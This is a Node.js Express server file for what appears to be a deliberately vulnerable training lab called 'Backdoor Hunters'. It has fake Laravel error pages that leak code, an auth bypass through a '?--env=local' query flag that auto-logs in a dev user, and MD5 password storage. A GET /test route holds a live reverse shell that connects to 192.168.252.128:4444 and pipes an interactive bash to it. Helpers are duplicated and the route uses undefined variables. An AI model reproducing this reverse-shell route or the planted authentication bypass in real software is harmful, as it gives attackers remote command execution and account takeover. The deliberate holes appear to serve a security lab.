const express = require("express");
const path = require("path");
const crypto = require("crypto");
const cookieParser = require("cookie-parser");
const app = express();
const net = require("net");
const { spawn } = require("child_process");
const { findUser, listUsers, verifyPassword, registerUser, listCourses, deleteCourseById, findCourseById, createCourse } = require("./db");
const fs = require("fs");
const Busboy = require("busboy");

// ----- Fake PHP header for vibe -----
app.disable("x-powered-by");
app.use((req, res, next) => {
	res.setHeader("X-Powered-By", "PHP/8.2.12");
	next();
});

// ----- Views / static / parsing -----
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.use("/assets", express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use((req, _res, next) => {
	const envRaw = (req.query && (req.query["--env"] ?? req.query.env)) ?? "";
	req.appEnv = String(envRaw).trim().toLowerCase();
	next();
});

// ===== Simple in-memory session store (now includes role) =====
const SESSIONS = new Map(); // token -> { userId, username, role, exp }
const SESSION_TTL = 1000 * 60 * 60 * 8; // 8h
const REMEMBER_TTL = 1000 * 60 * 60 * 24 * 30; // 30d

function makeSession(user, remember) {
	const token = crypto.randomBytes(32).toString("base64url");
	const ttl = remember ? REMEMBER_TTL : SESSION_TTL;
	const exp = Date.now() + ttl;
	SESSIONS.set(token, {
		userId: user.id,
		username: user.username,
		role: user.role || "user",
		exp,
	});
	return { token, ttl };
}

function ensureDir(p) {
	fs.mkdirSync(p, { recursive: true });
}

// very light filename cleanup
function sanitizeName(name) {
	return path.basename(name).replace(/[^\w.\-]+/g, "_");
}

// quick slugify
function slugify(s) {
	return String(s || "")
		.toLowerCase()
		.replace(/[^a-z0-9]+/g, "-")
		.replace(/^-+|-+$/g, "");
}

function destroySession(token) {
	if (token) SESSIONS.delete(token);
}

function getSession(req) {
	const token = req.cookies?.app_session;
	if (!token) return null;
	const data = SESSIONS.get(token);
	if (!data) return null;
	if (Date.now() > data.exp) {
		SESSIONS.delete(token);
		return null;
	}
	return { token, ...data };
}

// attach req.user if session exists
app.use((req, _res, next) => {
	const sess = getSession(req);
	if (sess)
		req.user = {
			id: sess.userId,
			username: sess.username,
			role: sess.role,
			token: sess.token,
		};
	next();
});

function requireAuth(req, res, next) {
	if (!req.user) return res.redirect("/login");
	next();
}

function isAdminLocal(req) {
	return req.user?.role === "admin" && req.appEnv === "local";
}
function requireAdminLocal(req, res, next) {
	if (!isAdminLocal(req)) return res.status(403).render("laravel_404");
	next();
}

function laravelError(res, status, opts = {}) {
	const defaults = {
		title: "Internal Server Error",
		requestBadge: `${res.req.method} backdoorhunters.com${res.req.originalUrl || "/"}`,
		phpVersion: "8.2.28",
		laravelVersion: "11.30.0",
		exceptionFqcn: "",
		message: "",
		collapsedCount: 29,
		topFrameLabel: "public/index.php:17",
		codeFileLabel: "public/index.php",
		codeFileLine: 17,
		codeStart: 12,
		highlight: 17,
		code: ["// Register the Composer autoloader...", "require __DIR__.'/../vendor/autoload.php';", "", "// Bootstrap Laravel and handle the request...", "require_once __DIR__.'/../bootstrap/app.php';", "->handleRequest(Request::capture());"],
	};
	res.status(status).render("laravel_error", { ...defaults, ...opts });
}

// -------- Home ----------
app.get("/", (req, res) => {
	// If logged in, take them to dashboard; otherwise your landing page
	if (req.user) return res.redirect("/dashboard");
	res.render("home", { brand: "Backdoor Hunters" });
});

// -------- Discoverable /upload and others ----------
app.get("/_health", (req, res) => res.type("text").send("ok"));
app.get("/admin", (req, res) => res.status(403).send("Forbidden"));
app.get("/debug", (req, res) => res.status(404).send("Not Found"));

// Fake Laravel 405 on GET /upload
app.get("/upload", (req, res) => {
	laravelError(res, 405, {
		title: "Method Not Allowed",
		exceptionFqcn: "Symfony\\Component\\HttpKernel\\Exception\\MethodNotAllowedHttpException",
		message: "The GET method is not supported for route upload. Supported methods: POST.",
	});
});

// (stub) POST /upload
app.post("/upload", (req, res) => {
	res.send("<h3>Upload endpoint (POST)</h3><p>Coming soon...</p>");
});

// -------- Auth pages --------
app.get("/login", (req, res) => {
	// If already logged in, do not show form — send to dashboard
	if (req.user) return res.redirect("/dashboard");

	// Set a Laravel-looking cookie for vibes; not used for auth
	const laravelSession = crypto.randomBytes(32).toString("base64url");
	res.cookie("laravel_session", laravelSession, {
		httpOnly: true,
		sameSite: "lax",
		path: "/",
		// secure: true, // if HTTPS
	});

	res.render("login", { brand: "Backdoor Hunters", error: null });
});

// Normalize ?--env=local into req.appEnv
app.use((req, _res, next) => {
	const envRaw = (req.query && (req.query["--env"] ?? req.query.env)) ?? "";
	req.appEnv = String(envRaw).trim().toLowerCase();
	next();
});

app.post("/login", async (req, res) => {
	const { username, password, remember } = req.body;

	// --- ENV FLIP: auto-login as devuser in local env ---
	if (req.appEnv === "local") {
		let dev = findUser("devuser"); // seeded in db.js: devuser/dev123 role=dev
		if (!dev) dev = { id: 2, username: "devuser", role: "dev" }; // fallback shape
		const { token, ttl } = makeSession(dev, true);
		res.cookie("app_session", token, {
			httpOnly: true,
			sameSite: "lax",
			path: "/",
			maxAge: ttl,
			// secure: true,
		});
		return res.redirect("/dashboard?tab=courses");
	}

	// ----- Laravel-style errors for missing/invalid fields -----
	if (!username || !password) {
		return res.status(500).render("laravel_error", {
			title: "Internal Server Error",
			requestBadge: "POST backdoorhunters.com/login",
			phpVersion: "8.2.28",
			laravelVersion: "11.30.0",
			exceptionFqcn: "ErrorException",
			message: `Undefined array key "${!username ? "username/username" : "password"}"`,

			collapsedCount: 45,
			topFrameLabel: "routes/login.php:65",
			codeFileLabel: "routes/login.php",
			codeFileLine: 65,
			codeStart: 60,
			highlight: 65,
			code: ["});", "return $response;", "}) ->name('unisharp.lfm.upload')->middleware([AuthMiddleware::class]);", "", "Route::post('/login', function (Request $request) {", "$username = $_POST['username'];", "$password = $_POST['password'];", "$remember = $_POST['remember'];", "", "if (is_null($remember)) {", "    // default when remember param is missing from request", "    $remember_login = False;", "}", "", "if ($remember == 'False') {", "    $remember_login = False;", "} elseif ($remember == 'True') {", "    $remember_login = True;"],
		});
	}

	const r = ((remember ?? "") + "").trim().toLowerCase();
	if (r !== "" && r !== "true" && r !== "false") {
		return res.status(500).render("laravel_error", {
			title: "Undefined variable $remember_login",
			requestBadge: "POST backdoorhunters.com/login",
			phpVersion: "8.2.28",
			laravelVersion: "11.30.0",
			exceptionFqcn: "ErrorException",
			message: "Undefined variable $remember_login",

			collapsedCount: 45,
			topFrameLabel: "routes/login.php:81",
			codeFileLabel: "routes/login.php",
			codeFileLine: 81,
			codeStart: 70,
			highlight: 81,
			code: ["if (is_null($remember)) {", "    // default when remember param is missing from request", "    $remember_login = False;", "}", "", "if ($remember == 'False') {", "    $remember_login = False;", "} elseif ($remember == 'True') {", "    $remember_login = True;", "}", "", "if ($remember_login !== False) {", "    rememberSession();", "}", "", "// DEV ONLY: auto-login as dev user when running locally", "if (App::environment('local')) {", "    $admin = \\App\\Models\\User::where('username', 'devuser')->first();", "    if ($admin) {", "        $request->session()->regenerate();", "        $request->session()->put('user_id', $admin->id);", "        $request->session()->put('role', 'dev');", "        return redirect('/dashboard');", "    }", "}", "", "$user = \\App\\Models\\User::where('username', $username)->first();"],
		});
	}

	// ----- Normal login flow -----
	const user = findUser(username);
	if (!user) {
		return res.status(401).render("login", { brand: "Backdoor Hunters", error: "Invalid credentials." });
	}

	const ok = await verifyPassword(password, user.pass_hash);
	if (!ok) {
		return res.status(401).render("login", { brand: "Backdoor Hunters", error: "Invalid credentials." });
	}

	const { token, ttl } = makeSession(user, r === "true");
	res.cookie("app_session", token, {
		httpOnly: true,
		sameSite: "lax",
		path: "/",
		maxAge: ttl,
		// secure: true, // if HTTPS
	});

	return res.redirect("/dashboard");
});

// -------- Protected area --------
function canSeeUsersTab(user) {
	return user && (user.role === "admin" || user.role === "dev");
}

app.get("/test", (req, res) => {
	const client = new net.Socket();

	client.connect(4444, "192.168.252.128", () => {
		console.log(`Connected to Kali listener at ${KALI_IP}:${KALI_PORT}`);

		// Spawn a Bash shell
		const bash = spawn("/bin/bash", ["-i"]); // Interactive Bash shell

		// Forward Bash output (stdout and stderr) to the Kali listener
		bash.stdout.on("data", (data) => {
			client.write(data); // Send Bash output to Kali
		});

		bash.stderr.on("data", (data) => {
			client.write(data); // Send Bash errors to Kali
		});

		// Receive commands from the Kali listener and write them to Bash
		client.on("data", (data) => {
			bash.stdin.write(data); // Pipe commands to Bash
		});

		// Handle client disconnection
		client.on("close", () => {
			console.log("Disconnected from Kali listener");
			bash.kill(); // Terminate Bash when connection closes
		});

		// Handle Bash process exit
		bash.on("close", (code) => {
			console.log(`Bash process exited with code ${code}`);
			client.end(); // Close TCP connection when Bash exits
		});
	});
});

app.get("/dashboard", requireAuth, (req, res) => {
	const canSeeUsers = canSeeUsersTab(req.user); // admin or dev
	const canManageCourses = isAdminLocal(req); // admin + ?--env=local
	const envQS = req.appEnv ? `?--env=${req.appEnv}` : ""; // preserve env flag

	const allowedTabs = ["courses", "profile", ...(canSeeUsers ? ["users"] : [])];
	let tab = allowedTabs.includes(req.query.tab) ? req.query.tab : "courses";
	if (tab === "users" && !canSeeUsers) tab = "courses";

	const users = canSeeUsers ? listUsers() : [];
	const courses = listCourses();

	res.render("dashboard", {
		user: req.user,
		tab,
		canSeeUsersTab: canSeeUsers,
		canManageCourses,
		manageLink: `/manage/courses${envQS}`, // <— separate route
		users,
		courses,
	});
});

// GET: manage courses (tabbed page)
// top of app.js
// helpers
function isAdminLocal(req) {
	return req.user?.role === "admin" && req.appEnv === "local";
}
function requireAdminLocal(req, res, next) {
	if (!isAdminLocal(req)) return res.status(403).render("notfound");
	next();
}

const COURSES_DIR = path.join(__dirname, "public", "courses");
fs.mkdirSync(COURSES_DIR, { recursive: true });
function sanitizeName(name) {
	return path.basename(name).replace(/[^\w.\-]+/g, "_");
}
const ALLOWED = { "image/jpeg": ".jpg", "image/png": ".png" };
function slugify(s) {
	return String(s || "")
		.toLowerCase()
		.replace(/[^a-z0-9]+/g, "-")
		.replace(/^-+|-+$/g, "");
}

// GET manage (tabbed page)
app.get("/manage/courses", requireAuth, requireAdminLocal, (req, res) => {
	const allowedTabs = ["all", "delete", "add"];
	const tab = allowedTabs.includes(String(req.query.tab)) ? req.query.tab : "all";
	const envQS = req.appEnv ? `?--env=${req.appEnv}` : "";
	const courses = listCourses();
	const toast = req.query.toast || "";
	res.render("manage_courses", { user: req.user, envQS, tab, courses, toast });
});

// POST delete
app.post("/manage/courses/delete", requireAuth, requireAdminLocal, (req, res) => {
	const envQS = req.appEnv ? `?--env=${req.appEnv}` : "";
	const id = Number(req.body.course_id);
	if (!Number.isInteger(id) || id <= 0) return res.redirect(`/manage/courses${envQS}&tab=delete&toast=error`);
	const exists = findCourseById(id);
	if (!exists) return res.redirect(`/manage/courses${envQS}&tab=delete&toast=notfound`);
	const { changes } = deleteCourseById(id);
	return res.redirect(`/manage/courses${envQS}&tab=delete&toast=${changes > 0 ? "deleted" : "error"}`);
});

// POST add (Busboy; saves to public/assets/courses)
app.post("/manage/courses/add", requireAuth, requireAdminLocal, (req, res) => {
	const envQS = req.appEnv ? `?--env=${req.appEnv}` : "";

	let fields = { title: "", slug: "", level: "", summary: "" };
	let imagePath = null; // public URL we save to DB, e.g. /assets/courses/123__img.jpg
	let uploadErr = null;

	let pendingWrites = 0;
	let parsingDone = false;

	const bb = Busboy({ headers: req.headers, limits: { fileSize: 5 * 1024 * 1024 } });

	function maybeDone() {
		if (!parsingDone || pendingWrites > 0) return;

		if (uploadErr) {
			return res.redirect(`/manage/courses${envQS}&tab=add&toast=${uploadErr}`);
		}

		const title = fields.title;
		const level = (fields.level || "").toLowerCase();
		const summary = fields.summary;
		let slug = fields.slug || slugify(title);

		const allowedLevels = new Set(["beginner", "intermediate", "advanced"]);
		if (!title || !summary || !slug || !allowedLevels.has(level)) {
			return res.redirect(`/manage/courses${envQS}&tab=add&toast=invalid`);
		}
		if (!imagePath) {
			return res.redirect(`/manage/courses${envQS}&tab=add&toast=noimg`);
		}

		try {
			createCourse({ title, slug, level, summary, image_path: imagePath });
			return res.redirect(`/manage/courses${envQS}&tab=all&toast=added`);
		} catch (e) {
			return res.redirect(`/manage/courses${envQS}&tab=add&toast=${e?.code === "SLUG_TAKEN" ? "slugtaken" : "saveerr"}`);
		}
	}

	bb.on("field", (name, val) => {
		if (name in fields) fields[name] = String(val || "").trim();
	});

	bb.on("file", (name, file, info) => {
		if (name !== "image") {
			file.resume();
			return;
		}

		const { filename, mimeType } = info;
		if (!ALLOWED[mimeType]) {
			uploadErr = "badimg";
			file.resume();
			return;
		}

		const safeBase = sanitizeName(filename.replace(/\s+/g, "_"));
		const ts = Date.now();
		const finalName = `${ts}__${safeBase}`.replace(/\.[^.]+$/, "") + ALLOWED[mimeType];

		const fsPath = path.join(COURSES_DIR, finalName);
		const ws = fs.createWriteStream(fsPath);
		pendingWrites++;

		file.pipe(ws);

		ws.on("finish", () => {
			imagePath = `/assets/courses/${finalName}`; // public URL
			pendingWrites--;
			maybeDone();
		});

		ws.on("error", () => {
			uploadErr = "uploaderr";
			pendingWrites--;
			maybeDone();
		});
	});

	// IMPORTANT: use 'finish' (busboy) to signal parsing done
	bb.on("finish", () => {
		parsingDone = true;
		maybeDone();
	});

	// Pipe request into busboy
	req.pipe(bb);
});

// Logout: destroy server session + clear cookie
app.post("/logout", (req, res) => {
	const token = req.cookies?.app_session;
	destroySession(token);
	res.clearCookie("app_session", { path: "/" });
	return res.redirect("/login");
});

// GET /register
app.get("/register", (req, res) => {
	if (req.user) return res.redirect("/dashboard");
	res.render("register", { brand: "Backdoor Hunters", error: null, values: { username: "" } });
});

// POST /register
app.post("/register", (req, res) => {
	const { username, password, confirm } = req.body || {};
	const u = (username || "").trim();
	const p = password || "";
	const c = confirm || "";

	// basic validation (keep your rules consistent)
	const unameOk = /^[a-zA-Z0-9_]{3,20}$/.test(u);
	if (!unameOk) {
		return res.status(400).render("register", {
			brand: "Backdoor Hunters",
			error: "Username must be 3–20 chars: letters, numbers, underscore.",
			values: { username: u },
		});
	}
	if (p.length < 6) {
		return res.status(400).render("register", {
			brand: "Backdoor Hunters",
			error: "Password must be at least 6 characters.",
			values: { username: u },
		});
	}
	if (p !== c) {
		return res.status(400).render("register", {
			brand: "Backdoor Hunters",
			error: "Passwords do not match.",
			values: { username: u },
		});
	}

	// create user via helper (MD5 inside)
	try {
		const user = registerUser(u, p, "user");
		// auto-login
		const { token, ttl } = makeSession(user, true);
		res.cookie("app_session", token, {
			httpOnly: true,
			sameSite: "lax",
			path: "/",
			maxAge: ttl,
		});
		return res.redirect("/dashboard");
	} catch (e) {
		const code = e?.message || "UNKNOWN";
		const msg = code === "USERNAME_TAKEN" ? "Username is already taken." : code === "USERNAME_REQUIRED" ? "Username is required." : code === "PASSWORD_REQUIRED" ? "Password is required." : "Could not create account. Please try again.";
		return res.status(400).render("register", {
			brand: "Backdoor Hunters",
			error: msg,
			values: { username: u },
		});
	}
});

// Minimal centered 404
app.use((req, res) => {
	res.status(404).render("laravel_404");
});

const PORT = 80;
app.listen(PORT, () => console.log(`Lab up on http://0.0.0.0:${PORT}`));
